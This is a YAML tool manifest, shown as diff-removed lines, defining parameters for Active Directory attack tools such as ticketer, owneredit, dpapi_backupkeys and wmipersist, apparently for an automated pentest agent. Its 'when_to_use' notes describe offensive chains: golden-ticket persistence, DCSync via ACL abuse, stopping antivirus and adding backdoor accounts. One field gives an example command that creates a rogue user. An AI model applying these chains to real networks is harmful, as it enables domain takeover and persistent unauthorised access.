-        values: [allowed, denied]
-        description: "ACE type: allowed or denied (default: allowed)"
-      inheritance:
-        type: boolean
-        description: "Enable ACE inheritance (CONTAINER_INHERIT + OBJECT_INHERIT)"
-      use_ldaps:
-        type: boolean
-        description: "Use LDAPS instead of LDAP"
-      file:
-        type: string
-        description: "Filename for backup/restore actions"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  owneredit:
-    required_ports: [389]
-    description: "Read or modify the owner of an Active Directory object. Useful for abusing WriteOwner permissions to take ownership of objects."
-    when_to_use: "When you have WriteOwner permission on an AD object. Take ownership first, then use dacledit to grant yourself additional rights. Common ACL abuse chain: WriteOwner -> owneredit (take ownership) -> dacledit (grant DCSync)."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Domain Controller IP or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format for pass-the-hash"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      action:
-        type: enum
-        values: [read, write]
-        default: read
-        description: "Action: read (view current owner) or write (set new owner)"
-      new_owner:
-        type: string
-        description: "sAMAccountName of the new owner (for write action)"
-      new_owner_sid:
-        type: string
-        description: "SID of the new owner (alternative to new_owner)"
-      target_object:
-        type: string
-        description: "sAMAccountName of the target object"
-      target_sid:
-        type: string
-        description: "SID of the target object"
-      target_dn:
-        type: string
-        description: "Distinguished Name of the target object"
-      use_ldaps:
-        type: boolean
-        description: "Use LDAPS instead of LDAP"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  # ── Kerberos Ticket Manipulation ───────────────────────────────────────
-
-  ticketer:
-    required_ports: [88]
-    description: "Create Kerberos golden or silver tickets. Golden ticket: omit spn (needs krbtgt hash + domain SID). Silver ticket: provide spn (needs service account hash). Also supports sapphire tickets via impersonate."
-    when_to_use: "After obtaining krbtgt hash (via secretsdump) to forge golden tickets for domain persistence. Or after obtaining a service account hash to forge silver tickets for targeted access without touching the DC."
-    params:
-      target_user:
-        type: string
-        required: true
-        description: "Username for the newly created ticket"
-      domain_name:
-        type: string
-        required: true
-        description: "Fully qualified domain name (e.g., contoso.com)"
-      domain_sid:
-        type: string
-        required: true
-        description: "Domain SID (e.g., S-1-5-21-...). Get from lookupsid."
-      spn:
-        type: string
-        description: "Service SPN for silver ticket (omit for golden ticket)"
-      nthash:
-        type: string
-        description: "NT hash used for signing the ticket (krbtgt for golden, service account for silver)"
-      groups:
-        type: string
-        description: "Comma-separated group RIDs (default: 513,512,520,518,519)"
-      user_id:
-        type: integer
-        description: "User RID for the ticket (default: 500 = Administrator)"
-      extra_sid:
-        type: string
-        description: "Comma-separated extra SIDs to include in PAC (for SID history attacks across trusts)"
-      extra_pac:
-        type: boolean
-        description: "Populate ticket with extra PAC (UPN_DNS)"
-      duration:
-        type: integer
-        description: "Ticket validity in hours (default: 87600 = 10 years)"
-      impersonate:
-        type: string
-        description: "Sapphire ticket: target username to impersonate via S4U2Self+U2U"
-      request:
-        type: boolean
-        description: "Request ticket from domain and clone it"
-      request_user:
-        type: string
-        description: "domain/username for request mode"
-      request_password:
-        type: string
-        description: "Password for request mode"
-      request_hashes:
-        type: string
-        description: "NTLM hashes for request mode (LMHASH:NTHASH)"
-      aes_key:
-        type: string
-        description: "AES key (128 or 256 bit) used for signing the ticket"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP for request mode"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  ticket_converter:
-    required_ports: []
-    description: "Convert Kerberos tickets between ccache and kirbi (KRB-CRED) formats. Converts .ccache to .kirbi for Rubeus/Mimikatz or vice versa."
-    when_to_use: "When you need to convert ticket formats between Linux (ccache) and Windows (kirbi) tools. Convert ccache from getTGT/getST to kirbi for use with Rubeus on a compromised Windows host."
-    params:
-      input_file:
-        type: string
-        required: true
-        description: "Path to input ticket file (.ccache or .kirbi)"
-      output_file:
-        type: string
-        required: true
-        description: "Path to output ticket file"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 30
-        description: "Timeout in seconds"
-
-  describe_ticket:
-    required_ports: []
-    description: "Parse and describe a Kerberos ticket. Decrypts the enc-part and parses the PAC if decryption keys are provided. Supports UnPAC-the-Hash for PKINIT tickets."
-    when_to_use: "To inspect ticket contents (principal, expiry, PAC groups, encryption type). Use with decryption keys to extract NT hash from PKINIT tickets (UnPAC-the-Hash attack)."
-    params:
-      ticket:
-        type: string
-        required: true
-        description: "Path to ticket file (.ccache)"
-      service_password:
-        type: string
-        description: "Cleartext password of the service account (for ticket decryption)"
-      service_user:
-        type: string
-        description: "Name of the service account"
-      service_domain:
-        type: string
-        description: "FQDN domain of the service account"
-      rc4:
-        type: string
-        description: "RC4 key (NT hash) for ticket decryption"
-      aes_key:
-        type: string
-        description: "AES128 or AES256 key for ticket decryption"
-      asrep_key:
-        type: string
-        description: "AS reply key for PAC Credentials decryption (UnPAC-the-Hash)"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 30
-        description: "Timeout in seconds"
-
-  get_pac:
-    required_ports: [88, 389]
-    description: "Retrieve the PAC (Privilege Attribute Certificate) for a target user. Requires valid domain credentials. Useful for inspecting group memberships, SID history, and privilege data."
-    when_to_use: "During enumeration to inspect a user's effective group memberships, SID history, and other privilege data stored in their PAC. Helps identify hidden group memberships."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Domain Controller IP or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      target_user:
-        type: string
-        required: true
-        description: "Target user to retrieve the PAC of"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  # ── Credential Extraction ──────────────────────────────────────────────
-
-  get_laps_password:
-    required_ports: [389]
-    description: "Extract LAPS (Local Administrator Password Solution) passwords from Active Directory via LDAP. Requires read access to ms-Mcs-AdmPwd attribute."
-    when_to_use: "After gaining domain credentials with LAPS read permissions. Extracts local admin passwords managed by LAPS. Common post-exploitation for lateral movement to workstations."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Domain Controller IP or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      computer:
-        type: string
-        description: "Target a specific computer by its name (default: all computers with LAPS)"
-      use_ldaps:
-        type: boolean
-        description: "Use LDAPS (required for Windows Server 2025 with LDAPS enforced)"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  get_gpp_password:
-    required_ports: [445]
-    description: "Find and decrypt Group Policy Preferences (GPP) passwords stored in SYSVOL XML files. Decrypts cpassword values using the publicly known AES key (MS14-025)."
-    when_to_use: "During enumeration after gaining any domain credentials. GPP passwords in SYSVOL are readable by all domain users. Commonly reveals local admin or service account passwords."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target DC or file server with SYSVOL share"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      xmlfile:
-        type: string
-        description: "Specific GPP XML file to parse (default: search all SYSVOL)"
-      share:
-        type: string
-        description: "SMB share to search (default: SYSVOL)"
-      base_dir:
-        type: string
-        description: "Directory to search in (default: /)"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  dpapi_backupkeys:
-    required_ports: [445]
-    description: "Retrieve DPAPI domain backup keys from a Domain Controller. Requires Domain Admin privileges. The backup key can decrypt any DPAPI-protected secret in the domain."
-    when_to_use: "After gaining Domain Admin access. The DPAPI backup key is the master key for all DPAPI-protected secrets in the domain (Chrome passwords, credential manager, etc.)."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target DC as [[domain/]username[:password]@]<hostname>"
-      hashes:
-        type: string
-        description: "NTLM hashes (LMHASH:NTHASH)"
-      kerberos:
-        type: boolean
-        description: "Use Kerberos authentication"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      export_keys:
-        type: boolean
-        description: "Export backup keys to file"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  keylistattack:
-    required_ports: [88]
-    description: "KERB-KEY-LIST-REQ attack to dump secrets from a Read-Only Domain Controller (RODC) without executing any agent. Requires RODC krbtgt credentials."
-    when_to_use: "When you have compromised an RODC's krbtgt account. Dump secrets for users cached on the RODC without needing code execution on the RODC itself."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target DC IP or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      rodc_no:
-        type: integer
-        description: "RODC krbtgt account number"
-      rodc_key:
-        type: string
-        description: "AES key of the Read Only Domain Controller"
-      full:
-        type: boolean
-        description: "Run attack against ALL domain users (noisy)"
-      target_user:
-        type: string
-        description: "Attack only this specific username"
-      target_file:
-        type: string
-        description: "File containing list of target usernames"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-
-  # ── AD Enumeration (new) ───────────────────────────────────────────────
-
-  get_ad_computers:
-    required_ports: [389]
-    description: "Enumerate Active Directory computer objects via LDAP. Returns computer names, OS versions, and optionally resolves IP addresses."
-    when_to_use: "During enumeration to discover all domain-joined computers, their operating systems, and IP addresses. Helps identify targets for lateral movement."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Domain Controller IP or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      filter_user:
-        type: string
-        description: "Filter for a specific computer name"
-      resolve_ip:
-        type: boolean
-        description: "Resolve IP addresses of computer objects via DNS"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  samrdump:
-    required_ports: [445]
-    description: "Dump SAM database user list via SAMR RPC. Lists all domain/local users with their attributes. Works via null session if allowed."
-    when_to_use: "For user enumeration when LDAP is unavailable. Works via null session on some older systems. Alternative to get_ad_users when you only have SMB access."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      csv:
-        type: boolean
-        description: "Output in CSV format"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  rpcdump:
-    required_ports: [135]
-    description: "Dump remote RPC endpoint information via the epmapper service. Lists all registered RPC interfaces with their UUIDs, versions, and binding strings."
-    when_to_use: "During enumeration to discover available RPC services. Identifies potential attack vectors (printer spooler for PrintNightmare, MS-EFSRPC for PetitPotam, etc.)."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  rpcmap:
-    required_ports: [135]
-    description: "Enumerate and bruteforce listening MSRPC interfaces. Discover hidden RPC services, bruteforce UUIDs, opnums, and versions."
-    when_to_use: "When rpcdump doesn't reveal all interfaces (some are hidden from MGMT). Brute-forces UUID ranges to find undocumented or custom RPC services."
-    params:
-      string_binding:
-        type: string
-        required: true
-        description: "String binding (e.g., ncacn_ip_tcp:192.168.0.1[135], ncacn_np:192.168.0.1[\\pipe\\spoolss])"
-      brute_uuids:
-        type: boolean
-        description: "Bruteforce UUIDs even if MGMT interface is available"
-      brute_opnums:
-        type: boolean
-        description: "Bruteforce opnums for found UUIDs"
-      brute_versions:
-        type: boolean
-        description: "Bruteforce major versions of found UUIDs"
-      uuid:
-        type: string
-        description: "Test only this specific UUID"
-      auth_rpc:
-        type: string
-        description: "RPC authentication as [domain/]username[:password]"
-      hashes_rpc:
-        type: string
-        description: "NTLM hashes for RPC auth (LMHASH:NTHASH)"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 120
-        description: "Timeout in seconds"
-
-  dump_ntlm_info:
-    required_ports: [445]
-    description: "Perform NTLM authentication and extract system information. Returns NetBIOS name, DNS domain, OS version, and other NTLM challenge metadata. No credentials required."
-    when_to_use: "During initial reconnaissance to fingerprint Windows hosts without credentials. Reveals OS version, domain membership, and hostname from NTLM challenge."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target hostname or IP address"
-      port:
-        type: integer
-        description: "Target port (default: 445 for SMB, use 135 for RPC)"
-      protocol:
-        type: enum
-        values: [SMB, RPC]
-        description: "Protocol: SMB or RPC (default: SMB)"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 30
-        description: "Timeout in seconds"
-
-  machine_role:
-    required_ports: [445]
-    description: "Retrieve a host's role (Workstation, Member Server, Domain Controller, etc.) and its primary domain details via SMB."
-    when_to_use: "During enumeration to determine if a target is a DC, member server, or workstation. Helps prioritize targets."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 30
-        description: "Timeout in seconds"
-
-  get_arch:
-    required_ports: [135]
-    description: "Detect the target system's OS architecture (32-bit vs 64-bit) via MSRPC. No credentials required."
-    when_to_use: "Before uploading payloads to determine if you need x86 or x64 binaries. Quick architecture check without authentication."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target hostname or IP address"
-      arch_timeout:
-        type: integer
-        description: "Socket timeout in seconds (default: 2)"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 30
-        description: "Timeout in seconds"
-
-  rdp_check:
-    required_ports: [3389]
-    description: "Test whether credentials are valid on a target host using the RDP protocol. Useful for validating credentials when SMB is blocked."
-    when_to_use: "When SMB (445) is filtered but RDP (3389) is open. Validates credentials without triggering SMB-based detections."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      ipv6:
-        type: boolean
-        description: "Test on IPv6"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 30
-        description: "Timeout in seconds"
-
-  # ── Services & Remote Management ───────────────────────────────────────
-
-  services:
-    required_ports: [445]
-    description: "Manipulate Windows services remotely via MSRPC. List, start, stop, delete, create, query status, or modify services."
-    when_to_use: "For persistence (create malicious service), defense evasion (stop AV service), or enumeration (list running services). Requires admin for most actions."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      action:
-        type: enum
-        required: true
-        values: [list, start, stop, delete, status, config, create, change]
-        description: "Action: list, start, stop, delete, status, config, create, change"
-      service_name:
-        type: string
-        description: "Service name (required for start/stop/delete/status/config/change)"
-      display_name:
-        type: string
-        description: "Display name for service creation"
-      binary_path:
-        type: string
-        description: "Binary path for service creation (e.g., 'cmd.exe /c net user evil Pass123! /add')"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  reg:
-    required_ports: [445]
-    description: "Remote Windows registry manipulation via MSRPC. Query, add, delete, save, or backup registry keys/values."
-    when_to_use: "For reading registry settings (SAM backup, LSA, security policies), modifying for persistence (Run keys, services), or extracting stored credentials."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      action:
-        type: enum
-        required: true
-        values: [query, add, delete, save, backup]
-        description: "Action: query, add, delete, save, backup"
-      key_name:
-        type: string
-        description: "Full registry key path (e.g., HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion)"
-      value_name:
-        type: string
-        description: "Registry value name to query (omit for all values)"
-      recursive:
-        type: boolean
-        description: "Query all subkeys and values recursively"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  net:
-    required_ports: [445]
-    description: "SAMR RPC client for user/group/computer enumeration and management. List, create, remove, enable, or disable accounts."
-    when_to_use: "For account management via SAMR RPC: create backdoor accounts, enable disabled accounts, enumerate local groups. Works when LDAP is unavailable."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      object_type:
-        type: enum
-        required: true
-        values: [user, computer, localgroup, group]
-        description: "Object type: user, computer, localgroup, group"
-      name:
-        type: string
-        description: "Display info for a specific object"
-      create_name:
-        type: string
-        description: "Create a new account with this name"
-      remove_name:
-        type: string
-        description: "Remove an existing account"
-      new_passwd:
-        type: string
-        description: "Password for newly created account"
-      enable_name:
-        type: string
-        description: "Enable a disabled account"
-      disable_name:
-        type: string
-        description: "Disable an account"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  mssqlclient:
-    required_ports: [1433]
-    description: "MSSQL client with TDS protocol support (SSL supported). Execute SQL commands, enable xp_cmdshell, or upload/execute commands."
-    when_to_use: "When MSSQL (port 1433) is accessible. Use for SQL command execution, enabling xp_cmdshell for OS command execution, or linked server abuse."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target MSSQL port (default: 1433)"
-      db:
-        type: string
-        description: "MSSQL database instance to connect to"
-      windows_auth:
-        type: boolean
-        description: "Use Windows Authentication (default: SQL auth)"
-      command:
-        type: string
-        description: "SQL command(s) to execute (for non-interactive use)"
-      file:
-        type: string
-        description: "Input file with SQL commands to execute"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  mssqlinstance:
-    required_ports: [1434]
-    description: "Query a remote host for running MSSQL instances via UDP discovery (port 1434). No credentials required."
-    when_to_use: "During enumeration to discover MSSQL instances on a host. Finds instance names, versions, and ports without authentication."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target hostname or IP address"
-      instance_timeout:
-        type: integer
-        description: "Timeout in seconds to wait for response"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 30
-        description: "Timeout in seconds"
-
-  wmiquery:
-    required_ports: [135]
-    description: "Execute WQL queries via WMI (Windows Management Instrumentation). Query system information, installed software, running processes, etc."
-    when_to_use: "For system enumeration via WMI queries: list processes, installed software, startup items, network config, etc. More flexible than wmiexec for data extraction."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      namespace:
-        type: string
-        description: "WMI namespace (default: //./root/cimv2)"
-      query_file:
-        type: string
-        description: "Input file with WQL queries to execute"
-      rpc_auth_level:
-        type: enum
-        values: [default, integrity, privacy]
-        description: "RPC auth level: default, integrity, or privacy"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  wmipersist:
-    required_ports: [135]
-    description: "Create or remove WMI event subscriptions for persistence. Installs a VBS script that triggers on a WQL filter or timer."
-    when_to_use: "For persistence via WMI event subscriptions. The VBS script executes whenever the WQL filter matches (e.g., on logon, timer, process start)."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      action:
-        type: enum
-        required: true
-        values: [install, remove]
-        description: "Action: install (create event subscription) or remove (delete subscription)"
-      event_name:
-        type: string
-        required: true
-        description: "Event subscription name (used for both install and remove)"
-      vbs_file:
-        type: string
-        description: "Path to VBS script file to execute (required for install)"
-      wql_filter:
-        type: string
-        description: "WQL filter string that triggers the script"
-      timer_ms:
-        type: integer
-        description: "Timer interval in milliseconds (alternative to WQL filter)"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  tstool:
-    required_ports: [445]
-    description: "Terminal Services / Remote Desktop manipulation. List sessions (qwinsta), list processes (tasklist), kill processes (taskkill), connect/disconnect sessions, send messages."
-    when_to_use: "For enumerating active RDP sessions, killing processes, or disconnecting users on a compromised terminal server."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target IP address or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      action:
-        type: enum
-        required: true
-        values: [qwinsta, tasklist, taskkill, tscon, tsdiscon, logoff, shutdown, msg, shadow]
-        description: "Action: qwinsta, tasklist, taskkill, tscon, tsdiscon, logoff, shutdown, msg, shadow"
-      pid:
-        type: integer
-        description: "Process ID for taskkill"
-      process_name:
-        type: string
-        description: "Process name for taskkill"
-      verbose:
-        type: boolean
-        description: "Verbose output for qwinsta/tasklist"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  exchanger:
-    required_ports: [135]
-    description: "Abuse Exchange services. Enumerate Address Books, dump tables, and lookup objects via the NSPI interface."
-    when_to_use: "For enumerating Exchange Global Address List (GAL) entries. Extracts email addresses, phone numbers, and other directory information."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target Exchange server IP or hostname"
-      username:
-        type: string
-        description: "Username for authentication"
-      password:
-        type: string
-        description: "Password for authentication"
-      domain:
-        type: string
-        description: "Active Directory domain name"
-      hashes:
-        type: string
-        description: "NTLM hash in LM:NT format"
-      kerberos:
-        type: boolean
-        default: false
-        description: "Use Kerberos authentication"
-      dc_ip:
-        type: string
-        description: "Domain Controller IP"
-      aes_key:
-        type: string
-        description: "AES key for Kerberos authentication"
-      port:
-        type: integer
-        description: "Target port"
-      rpc_hostname:
-        type: string
-        description: "Server name in GUID or NetBIOS format for RPC binding"
-      extra_args:
-        type: string
-        description: "Additional CLI flags as a single string"
-      timeout:
-        type: integer
-        default: 60
-        description: "Timeout in seconds"
-
-  # ── Privilege Escalation / Lateral Movement ────────────────────────────
-
-  golden_pac:
-    required_ports: [88, 445]
-    description: "MS14-068 exploit for Kerberos PAC validation vulnerability. Forges a golden ticket and optionally executes PSEXEC on the target."
-    when_to_use: "On unpatched DCs vulnerable to MS14-068. Exploits PAC validation to forge a golden ticket from any domain user credentials. Rare in modern environments but devastating when present."
-    params:
-      target:
-        type: string
-        required: true
-        description: "Target DC IP or hostname"
-      username:
-        type: string
